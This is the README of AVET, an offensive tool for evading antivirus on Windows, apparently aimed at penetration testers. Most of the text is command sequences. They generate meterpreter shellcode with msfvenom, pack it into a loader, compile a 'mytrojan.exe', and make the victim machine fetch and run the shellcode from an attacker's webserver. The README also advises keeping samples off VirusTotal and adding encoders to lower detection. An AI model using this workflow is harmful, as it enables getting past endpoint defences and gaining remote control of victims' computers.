AntiVirus Evasion Tool
======================

Avet was developed based on Backtrack 5, but also works with Kali 2. Shellcode downloading (-u) is a bit buggy and noisy, so better use the -f switch. 

Because of the huge interest I decided to spend some time for enhancing & developing avet.

For basics about antivirus evasion have a look at my old article: https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf
and: https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf

What & Why:
- when running an exe file made with msfpayload & co, the exe file will often be recognized by the antivirus software
- avet is a antivirus evasion tool targeting windows machines
- avet includes two tools, avet.exe with different antivirus evasion techniques and make_avet for compiling a preconfigured binary file
- avet.exe loads ASCII encoded shellcode from a textfile or from a webserver, further it is using an av evasion technique to avoid sandboxing and emulation
- for encoding the shellcode the tool format.sh and sh_format are included
- this readme applies for Kali 2 and tdm-gcc

How to install tdm-gcc with wine:
https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/


How to use avet.exe
-------------------

You can use the precompiled avet.exe file as a shellcode loader.

Example 1, loading shellcode from a file:

Attackers machine:
```
$ msfvenom -p windows/meterpreter/bind_tcp -f c -a x86 --platform Windows > sh.txt
$ ./format.sh sc.txt > sc_clean.txt
```

Copy sc_clean.txt & avet.exe to the victim machine.
```
$ msfconsole
msf > use multi/handler
msf  exploit(handler) > set payload windows/meterpreter/bind_tcp 
msf  exploit(handler) > set rhost xyz
msf  exploit(handler) > exploit 
```

On the victim machine:
```
c:\whatever>avet.exe -f shellcode.txt
```

Example 2, loading shellcode from a webserver:

Attackers machine:
```
$ msfvenom -p windows/meterpreter/bind_tcp -f c -a x86 --platform Windows > sh.txt
$ ./format.sh sc.txt > sc_clean.txt
```

Copy sc_clean.txt to your webroot and avet.exe to the victim machine.
```
$ msfconsole
msf > use multi/handler
msf  exploit(handler) > set payload windows/meterpreter/bind_tcp 
msf  exploit(handler) > set rhost xyz
msf  exploit(handler) > exploit 
```

On the victim machine:
```
c:\whatever>avet.exe -u yourserver/sc_clean.txt
```

How to use make_avet
--------------------
Compile if needed:
```
$ gcc -o make_avet make_avet.c
```

Example 1, compile shellcode into the .exe file:
```
$ msfvenom -p windows/meterpreter/bind_tcp -f c -a x86 --platform Windows > sh.txt
$ ./format.sh sh.txt > sh_clean.txt
$ ./make_avet -f sh_clean.txt
$ wine gcc.exe -m32 -o mytrojan.exe avet.c
```

Example 2, make an .exe file that downloads a shellcode from a webserver:
```
$ msfvenom -p windows/meterpreter/bind_tcp -f c -a x86 --platform Windows > sh.txt
$ ./format.sh sh.txt > sh_clean.txt
$ cp sh_clean.txt /var/www
$ ./make_avet -u 192.168.2.112/sh_clean.txt
$ wine gcc.exe -m32 -o mytrojan.exe avet.c
```

Check out the other options as well:
```
-f compile shellcode into avet.exe, needs filename
-u load and exec shellcode from url using internet explorer
-p print debug information
-h help
```

Some notes
----------

Rebuild avet.exe:
No problem, ensure no content is in defs.h (`echo "">defs.h`), then compile with:
```
$ wine gcc.exe -m32 -o avet.exe avet.c
```

Have a look for build.sh for easier handling.

Do not upload your samples to virustotal or similar platforms.

For adding more random (and lower chances of detection) to the binary additionaly use msf encoders like shikata ga nai.
